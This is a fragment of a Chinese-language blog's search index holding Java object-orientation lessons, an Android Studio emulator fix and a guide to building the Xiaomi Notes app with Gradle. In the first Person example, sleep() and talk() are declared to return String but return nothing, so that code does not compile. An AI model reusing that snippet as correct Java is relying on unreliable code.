class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//测试类</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PersonTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>        <span class="hljs-comment">//创建Person类的对象</span><br>        Person p1 = <span class="hljs-keyword">new</span> Person();<br>        <span class="hljs-comment">//Scanner scanner = new Scanner(System.in);</span><br>        <br>        <span class="hljs-comment">//调用对象的结构：属性、方法</span><br>        <span class="hljs-comment">//调用属性：“对象.属性”</span><br>        p1.name = <span class="hljs-string">&quot;Tom&quot;</span>;<br>        p1.isMale = <span class="hljs-keyword">true</span>;<br>        System.out.println(p1.name);<br>        <span class="hljs-comment">//调用方法：“对象.方法”</span><br>        p1.eat();<br>        p1.sleep();<br>        p1.talk(<span class="hljs-string">&quot;Chinese&quot;</span>);<br>        <span class="hljs-comment">//***********************</span><br>        Person p2 = <span class="hljs-keyword">new</span> Person();<br>        System.out.println(p2.name); <span class="hljs-comment">//Tom? null? 报错?</span><br>        <span class="hljs-comment">//如果创建了一个类的多个对象，则每个对象都独立的拥有一套类的属性。（非static的）</span><br>        <span class="hljs-comment">//意味着如果我们修改一个对象的属性a，则不影响另一个对象的属性a的值。</span><br>        <span class="hljs-comment">//***********************</span><br>        <span class="hljs-comment">//将p1变量保存的对象地址值赋给p3，导致p1和p3指向了堆空间中的同一对象实体。</span><br>        Person p3 = p1;<br>        System.out.println(p3.name); <span class="hljs-comment">//Tom</span><br>        <br>        p3.age = <span class="hljs-number">10</span>;<br>        System.out.println(p1.age); <span class="hljs-comment">//10</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-comment">//属性</span><br>    String name;<br>    <span class="hljs-keyword">int</span> age = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">boolean</span> isMale;<br>    <span class="hljs-comment">//方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">eat</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;人可以吃饭&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">sleep</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;人可以睡觉&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">talk</span><span class="hljs-params">(String language)</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;人可以说话，使用的是：&quot;</span> + language);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="对象的内存解析："><a href="#对象的内存解析：" class="headerlink" title="对象的内存解析："></a>对象的内存解析：</h3><p><img src="/2021/10/02/Code/Java/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/e4a1d04de3e924f114c5a5fa9dadb83c.png" alt="image-20211002222541178"></p><p><img src="/2021/10/02/Code/Java/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/7c2475169f0ee232e823609ac1f2b61f.png" alt="image-20211002223855789"></p><h3 id="类中属性的使用"><a href="#类中属性的使用" class="headerlink" title="类中属性的使用"></a>类中属性的使用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 属性（成员变量） vs 局部变量</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 1、相同点：</span><br><span class="hljs-comment"> *     1.1 定义变量的格式：数据类型 变量名 = 变量值</span><br><span class="hljs-comment"> *     1.2 先声明，后使用</span><br><span class="hljs-comment"> *     1.3 变量都有其对应的作用域</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 2、不同点：</span><br><span class="hljs-comment"> *     2.1 在类中声明的位置的不同</span><br><span class="hljs-comment"> * 属性：直接定义在类的一对&#123;&#125;内</span><br><span class="hljs-comment"> * 局部变量：声明在方法内、方法形参、代码块内、构造器形参、构造器内部的变量</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *     2.2 关于权限修饰符的不同</span><br><span class="hljs-comment"> * 属性：可以在声明属性时，指明其权限，使用权限修饰符</span><br><span class="hljs-comment"> *  常用的权限修饰符：private、public、缺省、protected  ---&gt;封装性</span><br><span class="hljs-comment"> * 局部变量：不可以使用权限修饰符</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *     2.3 默认初始化值的情况</span><br><span class="hljs-comment"> * 属性：类的属性，根据其类型，都有默认初始化值</span><br><span class="hljs-comment"> * 整形（byte、short、int、long）：0</span><br><span class="hljs-comment"> * 浮点型（float、double）：0.0</span><br><span class="hljs-comment"> * 字符型（char）：0或‘\u0000’</span><br><span class="hljs-comment"> * 布尔型（boolean）：false</span><br><span class="hljs-comment"> * 引用数据类型（类、数组、接口）：null</span><br><span class="hljs-comment"> * 局部变量：没有默认初始化值</span><br><span class="hljs-comment"> * 意味着，我们在调用局部变量之前，一定要显式赋值</span><br><span class="hljs-comment"> * 特别的，形参在调用时赋值即可</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *    2.4 在内存中加载的位置的不同</span><br><span class="hljs-comment"> * 属性：加载到堆空间中（非static）</span><br><span class="hljs-comment"> * 局部变量：加载到栈空间中</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br>    <br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>        User u1 = <span class="hljs-keyword">new</span> User();<br>        System.out.println(u1.name);<br>        System.out.println(u1.age);<br>        System.out.println(u1.isMale);<br>        u1.talk(<span class="hljs-string">&quot;日语&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-comment">//属性（成员变量）</span><br>    String name;<br>    <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-keyword">boolean</span> isMale;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">talk</span><span class="hljs-params">(String language)</span></span>&#123;  <span class="hljs-comment">//language:形参，也是局部变量</span><br>        System.out.println(<span class="hljs-string">&quot;我们使用&quot;</span> + language + <span class="hljs-string">&quot;进行交流&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">eat</span><span class="hljs-params">()</span></span>&#123;<br>        String food = <span class="hljs-string">&quot;烙饼&quot;</span>;  <span class="hljs-comment">//局部变量</span><br>        System.out.println(<span class="hljs-string">&quot;北方人喜欢吃：&quot;</span> + food);<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="类中方法的声明和使用"><a href="#类中方法的声明和使用" class="headerlink" title="类中方法的声明和使用"></a>类中方法的声明和使用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 类中方法的声明和使用</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 方法：描述类应该具有的功能</span><br><span class="hljs-comment"> * 比如：Math类，sqrt() \ random() \ ······</span><br><span class="hljs-comment"> *    Scanner类：nextXxx() ······</span><br><span class="hljs-comment"> *      Arrays类：sort() \ binarySearch() \ toString() \ equals() \ ······</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 1、举例</span><br><span class="hljs-comment"> * public void eat()&#123;&#125;</span><br><span class="hljs-comment"> * public void sleep(int hour)&#123;&#125;</span><br><span class="hljs-comment"> * public String getName()&#123;&#125;</span><br><span class="hljs-comment"> * public String getNation(String nation)&#123;&#125;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 2、方法的声明：权限修饰符 返回值类型 方法名(形参列表)&#123;</span><br><span class="hljs-comment"> * 方法体</span><br><span class="hljs-comment"> *&#125;</span><br><span class="hljs-comment"> * 注意：static、final、abstract 来修饰的方法</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 3、说明：</span><br><span class="hljs-comment"> * 3.1关于权限修饰符：</span><br><span class="hljs-comment"> * Java规定的4种权限修饰符：private、public、缺省、protected</span><br><span class="hljs-comment"> * 3.2返回值类型：</span><br><span class="hljs-comment"> *3.3方法名：属于标识符，遵循标识符的规则和规范，见名知意。</span><br><span class="hljs-comment"> *3.4形参列表：方法可以声明0个，1个，或多个形参</span><br><span class="hljs-comment"> *格式：数据类型1 形参1, 数据类型2 形参2, ······</span><br><span class="hljs-comment"> *      3.5方法体：方法功能的实现</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 4、return关键字的使用：</span><br><span class="hljs-comment"> *1.适用范围：使用在方法体中</span><br><span class="hljs-comment"> *2.作用：结束方法</span><br><span class="hljs-comment"> *   针对于有返回值的方法，使用“return 数据”方法返回所要的数据</span><br><span class="hljs-comment"> *      3.注意点：return关键字后面不可以声明执行语句</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 5、方法的使用：可以调用当前类的属性或方法</span><br><span class="hljs-comment"> *1.递归：栈溢出</span><br><span class="hljs-comment"> *2.方法中，不可以定义方法</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CustomerTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>        Customer cust1 = <span class="hljs-keyword">new</span> Customer();<br>        cust1.eat();<br>        cust1.sleep(<span class="hljs-number">8</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//客户类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Customer</span></span>&#123;<br>    <span class="hljs-comment">//属性</span><br>    String name;<br>    <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-keyword">boolean</span> isMale;<br>    <br>    <span class="hljs-comment">//方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">eat</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;客户吃饭&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-keyword">int</span> hour)</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;休息了&quot;</span> + hour + <span class="hljs-string">&quot;个小时&quot;</span>);<br>        eat();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getNation</span><span class="hljs-params">(String nation)</span></span>&#123;<br>        String info = <span class="hljs-string">&quot;我的国籍是：&quot;</span> + nation;<br>        <span class="hljs-keyword">return</span> info;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>面向对象</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio报错</title>
    <link href="/2021/09/20/Code/Java/Android-Studio%E6%8A%A5%E9%94%99/"/>
    <url>/2021/09/20/Code/Java/Android-Studio%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio报错"><a href="#Android-Studio报错" class="headerlink" title="Android Studio报错"></a>Android Studio报错</h1><h2 id="Number-1"><a href="#Number-1" class="headerlink" title="Number 1"></a>Number 1</h2><h3 id="运行自带模拟器报错："><a href="#运行自带模拟器报错：" class="headerlink" title="运行自带模拟器报错："></a>运行自带模拟器报错：</h3><p><strong>The emulator process for AVD Pixel_2_API_29 has terminated.</strong></p><h3 id="可能原因："><a href="#可能原因：" class="headerlink" title="可能原因："></a>可能原因：</h3><ul><li>虚拟机安装路径存在中文符号导致乱码，因为当前用户路径有中文符号，导致一些配置文件中的路径会乱码，这时虚拟机就会运行失败。</li><li>C 盘空间不足 。</li><li>其他</li></ul><h3 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h3><p><strong>将模拟器放到D盘</strong></p><p>1、进入 <strong>C:\Users\13562</strong> 目录，找到 <strong>.android</strong> 文件夹，这个是模拟器默认下载位置 。</p><p>2、剪切 <strong>.android</strong> 文件夹，粘贴到其他文件夹（切记不可有中文路径），比如我放到了 <strong>D:\Android</strong> 目录下。</p><p>3、进入 <strong>.android/avd</strong>，修改对应的 <strong>Pixel_2_API_29.ini</strong> 文件 。</p><p>4、打开 <strong>Pixel_2_API_29.ini</strong> 文件，修改 <strong>path</strong> ，将其进行如下修改，注意 <strong>ini 配置文件</strong>要和 <strong>avd 目录对应</strong>且必须为<strong>对应 avd 目录的子路径</strong>。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">avd.ini.encoding</span>=UTF-<span class="hljs-number">8</span><br><span class="hljs-attr">path</span>=D:\Android\.android\avd\Pixel_2_API_29.avd<br><span class="hljs-attr">path.rel</span>=avd\Pixel_2_API_29.avd<br><span class="hljs-attr">target</span>=android-<span class="hljs-number">29</span><br></code></pre></td></tr></table></figure><p>5、配置用户环境变量</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">变量名：ANDROID_SDK_HOME<br>变量值：D:<span class="hljs-string">\Android</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>Android studio</tag>
      
      <tag>error</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio运行小米便签</title>
    <link href="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/"/>
    <url>/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio运行小米便签"><a href="#Android-Studio运行小米便签" class="headerlink" title="Android Studio运行小米便签"></a>Android Studio运行小米便签</h1><h2 id="1、源码下载"><a href="#1、源码下载" class="headerlink" title="1、源码下载"></a>1、源码下载</h2><p>从 GitHub 或 Gitee 上下载源码压缩包后，进行解压，得到小米便签的源码 。</p><p>GitHub：<a href="https://github.com/MiCode/Notes">MiCode/Notes: 小米便签社区开源版（Community edition of XM notepad/MIUI notes) (github.com)</a></p><p>Gitee：<a href="https://gitee.com/mirrors/Notes">Notes: MiCode 便签是小米便签的社区开源版，由MIUI团队(www.miui.com) 发起并贡献第一批代码，遵循NOTICE文件所描述的开源协议 这个应用从Android开发者角度 (gitee.com)</a></p><h2 id="2、导入项目"><a href="#2、导入项目" class="headerlink" title="2、导入项目"></a>2、导入项目</h2><p>小米便签的源代码<strong>最后修改时间是在12年</strong>，那时候的代码是使用 <strong>Eclipse</strong> 开发的，因此，需要将其转换成能在 <strong>Android studio 下运行的 gradle 项目</strong> 。</p><p>1）在 <strong>Android studio</strong> 上，依次点击 <strong>File -&gt; New -&gt; Import Project</strong> ，选择刚才解压的小米便签的源码 <strong>Notes-master</strong> ，<strong>OK</strong> 。</p><p>2）选择导入到的目录，这里我选择默认，<strong>Next</strong> ，可能会提醒目录不存在是否创建，选择 <strong>Create</strong> 创建就好 。</p><p>3）去掉上面两个选项的勾勾 ，<strong>Finish</strong> ，等待加载完成。</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/9fcc248ac694f72956c6e94bb84dbf30.png" alt="image-20210921110350007" style="zoom:50%;"></p><h2 id="3、配置构建Gradle"><a href="#3、配置构建Gradle" class="headerlink" title="3、配置构建Gradle"></a>3、配置构建Gradle</h2><p>1）第一次构建可能会出现如下问题：</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/5caa4949da48d097cff01f90f0c44433.png" alt="image-20210921112459359"></p><p>对如图选中的 <strong>build.gradle</strong> 进行修改 。</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/ac241313aa4181d2eaac06938cfe9382.png" alt="image-20210921144823441" style="zoom:50%;"></p><p>这是我的配置，添加了 <code>google()</code> ，如果添加了还是不可以或者想快一些，可以试试换成阿里的镜像 。（将 <code>jcenter()</code> 和 <code>google()</code> 换成我注释的那四句 ）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Top-level build file where you can add configuration options common to all sub-projects/modules.</span><br>buildscript &#123;<br>    repositories &#123;<br>        jcenter()<br>        google()<br>        <span class="hljs-comment">//maven &#123; url &#x27;https://maven.aliyun.com/nexus/content/repositories/google&#x27; &#125;</span><br>        <span class="hljs-comment">//maven &#123; url &#x27;https://maven.aliyun.com/nexus/content/repositories/jcenter&#x27;&#125;</span><br>    &#125;<br>    dependencies &#123;<br>        classpath <span class="hljs-string">&#x27;com.android.tools.build:gradle:7.0.2&#x27;</span><br>    &#125;<br>&#125;<br><br>allprojects &#123;<br>    repositories &#123;<br>        jcenter()<br>        google()<br>        <span class="hljs-comment">//maven &#123; url &#x27;https://maven.aliyun.com/nexus/content/repositories/google&#x27; &#125;</span><br>        <span class="hljs-comment">//maven &#123; url &#x27;https://maven.aliyun.com/nexus/content/repositories/jcenter&#x27;&#125;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2）配置完成后，重新构建，出现两个警告，点进去查看 。</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/bf1f137450a1b31fb45dea9c503d7da2.png" alt="image-20210921112311252"></p><p>第一个显示 <strong>minsdk 不应该被声明</strong> ，点进去，把它<strong>注释掉</strong> 。</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/b160161b0f98d53c5df2c089ff3bf137.png" alt="image-20210921113142890"></p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/ffc31704ae7b4d61ea39320c8be695c7.png" alt="image-20210921113312395"></p><p>第二个显示要用 Java 11，<strong>File</strong> -&gt; <strong>Settings</strong> -&gt; <strong>Build,Execution,Deployment</strong> -&gt; <strong>Build Tools</strong> -&gt; <strong>Gradle</strong> ，在 <strong>Gradle JDK</strong> 中选择 <strong>Android Studio Default JDK</strong> 。</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/aea35eaa593553d2e63f68da64a43175.png" alt="image-20210921113202518"></p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/6ad4dd56d55649a42ccd7b4b09b4fdc5.png" alt="image-20210921145828053" style="zoom:50%;"></p><p>3）成功构建 。</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/d051fa30722bad8a4891fd05f6fa1a44.png" alt="image-20210921113747570"></p><h2 id="4、运行"><a href="#4、运行" class="headerlink" title="4、运行"></a>4、运行</h2><p>1）点击小锤子，创建项目，出现错误。</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/c9c7b8e6b39f2b6b1cc992cf045e025e.png" alt="image-20210921113857315"></p><p>这个错误应该是版本问题导致的，毕竟小米便签好多年前的东西了，对于这个问题的解决不唯一吧，可以下载相关组件，替换过时不再用的函数，也可以对版本进行回退。由于我比较懒，加上刚开始学习 Java，这里我选择版本回退 。</p><p>2）版本回退</p><p>具体的版本要求可以去官方查看，这里只是简单的列举了<strong>Gradle 版本</strong>和<strong>Gradle 插件版本</strong>之间的对应关系，实际应用还是要看 AS 版本支持的版本的，所以最好去官网看一下，要不然像我一样瞎试的话，可能会挤爆C盘 。</p><p>官网：<a href="https://developer.android.google.cn/studio/releases/gradle-plugin">Android Gradle 插件版本说明  | Android 开发者  | Android Developers (google.cn)</a></p><div class="table-container"><table><thead><tr><th style="text-align:left">插件版本</th><th style="text-align:left">所需的 Gradle 版本</th></tr></thead><tbody><tr><td style="text-align:left">1.0.0 - 1.1.3</td><td style="text-align:left">2.2.1 - 2.3</td></tr><tr><td style="text-align:left">1.2.0 - 1.3.1</td><td style="text-align:left">2.2.1 - 2.9</td></tr><tr><td style="text-align:left">1.5.0</td><td style="text-align:left">2.2.1 - 2.13</td></tr><tr><td style="text-align:left">2.0.0 - 2.1.2</td><td style="text-align:left">2.10 - 2.13</td></tr><tr><td style="text-align:left">2.1.3 - 2.2.3</td><td style="text-align:left">2.14.1 - 3.5</td></tr><tr><td style="text-align:left">2.3.0+</td><td style="text-align:left">3.3+</td></tr><tr><td style="text-align:left">3.0.0+</td><td style="text-align:left">4.1+</td></tr><tr><td style="text-align:left">3.1.0+</td><td style="text-align:left">4.4+</td></tr><tr><td style="text-align:left">3.2.0 - 3.2.1</td><td style="text-align:left">4.6+</td></tr><tr><td style="text-align:left">3.3.0 - 3.3.3</td><td style="text-align:left">4.10.1+</td></tr><tr><td style="text-align:left">3.4.0 - 3.4.3</td><td style="text-align:left">5.1.1+</td></tr><tr><td style="text-align:left">3.5.0 - 3.5.4</td><td style="text-align:left">5.4.1+</td></tr><tr><td style="text-align:left">3.6.0 - 3.6.4</td><td style="text-align:left">5.6.4+</td></tr><tr><td style="text-align:left">4.0.0+</td><td style="text-align:left">6.1.1+</td></tr><tr><td style="text-align:left">4.1.0+</td><td style="text-align:left">6.5+</td></tr><tr><td style="text-align:left">4.2.0+</td><td style="text-align:left">6.7.1+</td></tr><tr><td style="text-align:left">7.0</td><td style="text-align:left">7.0+</td></tr></tbody></table></div><p>在几次尝试后，发现了可用版本（<strong>4.0.0 - 6.1.1</strong>） 。</p><p>在相应的配置文件里进行修改 ，修改完后点击 <strong>Sync Now</strong> 进行同步。</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/f3c04275f92dfc374950dd421849a9c1.png" alt="image-20210921160219213" style="zoom:50%;"></p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/299dd8853599838d4c8d26cbff4c54ae.png" alt="image-20210921160238693" style="zoom:50%;"></p><p>3）重新构建之后有警告，显示 <strong>Build Tools 版本不行</strong>，尝试换一个版本，改成 <strong>29.0.2</strong> ，改了之后还是有些警告，尝试将 <strong>compileSDKVersion 改为 22</strong> ，点击 <strong>Sync Now</strong> 进行同步，就没问题了。</p><blockquote><p>compileSDKVersion 改为 22 后，可能会报错，按照提示安装相应的包就好了 。</p></blockquote><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/5f70f002b0d29db0e4847cf32f7b6da7.png" alt="image-20210921163317552" style="zoom:50%;"></p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/adeedac1df3b421fcd0852490bca3d1f.png" alt="image-20210921164130326" style="zoom:50%;"></p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/aedb16928afd63d5c13311da5a3cc4ba.png" alt="image-20210921205430085" style="zoom:50%;"></p><p>4）最后进行运行，创建项目没问题，但运行时，虚拟机启动了但一直显示 <strong>Waiting for all target devices to come online</strong> 同时APP界面没有出现，我猜测是内核不是很支持，所以我从一开始用的 <strong>29 内核</strong> 换了一个 <strong>22 内核</strong>，结果就出来了 。当然问题可能不是这个导致的，这里就不去深究了 。</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/94b9711e60598ea71d4db938d8f36b89.png" alt="image-20210921205641615"></p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/dcded08c484043739cdcbfe8b0ac9f03.png" alt="image-20210921171913923"></p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/1e0e8d31716a91ac84ac78e0cf263721.png" alt="image-20210921171629739"></p>]]></content>
    
    
    <categories>
      
